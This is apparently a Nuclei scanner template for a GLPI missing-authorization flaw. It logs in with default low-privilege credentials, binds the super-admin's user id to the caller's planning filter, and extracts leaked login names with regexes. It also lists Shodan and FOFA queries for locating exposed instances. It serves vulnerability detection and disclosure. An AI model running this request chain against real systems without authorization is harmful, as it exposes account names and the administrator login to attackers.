id: glpi-planning-user-enumeration

info:
  name: GLPI Planning - Missing Authorization to Account Enumeration
  author: wong-hau-pepelu
  severity: medium
  description: |
    The GLPI planning feature dispatches front/planning.form.php without any
    authorization check. Planning::sendAddUserForm() binds an attacker-supplied
    users_id to the caller's planning filter after only validating users_id > 0,
    so a low-privileged account whose planning right is READMY ("own planning
    only") can bind any other user. Rendering the filter list afterwards
    (ajax/planning.php?action=get_filters_form) discloses the bound user's
    display name and CalDAV login, turning the missing check into a full account
    enumeration and valid-id oracle.
  impact: |
    Any authenticated user without the planning READALL right can enumerate every
    account's display name and login on the instance, including the super-admin
    (user id 2 on a default install). This exposes the administrator login name
    and the complete user roster to a user who is authorized to see only their own
    planning.
  remediation: |
    Upgrade to a GLPI release that adds a right check to the planning form
    dispatcher (GHSA-5fw5-vgrw-ggp5 / GHSA-j5vx-jrmw-2498). As an interim measure,
    restrict access to the planning feature to trusted profiles.
  reference:
    - https://github.com/advisories/GHSA-5fw5-vgrw-ggp5
    - https://github.com/advisories/GHSA-j5vx-jrmw-2498
    - https://github.com/glpi-project/glpi
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 4.3
    cwe-id: CWE-862
  metadata:
    verified: false
    max-request: 5
    vendor: glpi-project
    product: glpi
    shodan-query: http.title:"Authentication - GLPI"
    fofa-query: app="GLPI"
  tags: glpi,planning,authz,idor,enum,missing-authorization

variables:
  # Any account whose planning right is NOT READALL demonstrates the flaw.
  # The default low-privilege Observer account on a fresh GLPI install is normal/normal.
  username: "normal"
  password: "normal"
  # User id to bind and disclose. 2 is the built-in super-admin "glpi" on a default install.
  victim_id: "2"

http:
  - raw:
      # 1) fetch the login page and its single-use CSRF token
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

      # 2) authenticate as the low-privilege account
      - |
        POST /front/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        login_name={{username}}&login_password={{password}}&_glpi_csrf_token={{login_csrf}}&redirect=

      # 3) open the planning page: initialises the planning session and yields a
      #    fresh single-use CSRF token for the next POST
      - |
        GET /front/planning.php HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

      # 4) the missing-authz call: bind a foreign user to our planning filter.
      #    No right check is performed; only users_id > 0 is validated.
      - |
        POST /front/planning.form.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=send_add_user_form&users_id={{victim_id}}&_glpi_csrf_token={{bind_csrf}}

      # 5) render the filter list; the bound foreign user's name/login leak here
      - |
        GET /ajax/planning.php?action=get_filters_form HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    req-condition: true
    matchers-condition: and
    matchers:
      # genuine planning-filter response, i.e. the login actually succeeded
      - type: dsl
        dsl:
          - 'status_code_5 == 200'
          - 'contains(body_5, "id=\"planning_filter\"")'

      # the foreign victim is now present in a READMY user's own filter list:
      # this is the authorization bypass itself
      - type: dsl
        dsl:
          - 'contains(body_5, "event_name=\"user_{{victim_id}}\"")'

      # the bound id resolved to a real account (CalDAV login is emitted only for
      # resolvable users), proving the account was disclosed, not a blank "N/A"
      - type: dsl
        dsl:
          - 'contains(body_5, "\\/calendar")'

    extractors:
      - type: regex
        name: login_csrf
        internal: true
        part: body_1
        group: 1
        regex:
          - 'name="_glpi_csrf_token"[^>]*value="([^"]+)"'

      - type: regex
        name: bind_csrf
        internal: true
        part: body_3
        group: 1
        regex:
          - 'name="_glpi_csrf_token"[^>]*value="([^"]+)"'

      # the disclosed login name(s) of the bound account(s)
      - type: regex
        part: body_5
        group: 1
        regex:
          - 'users\\/([A-Za-z0-9_.\-]+)\\/calendar'
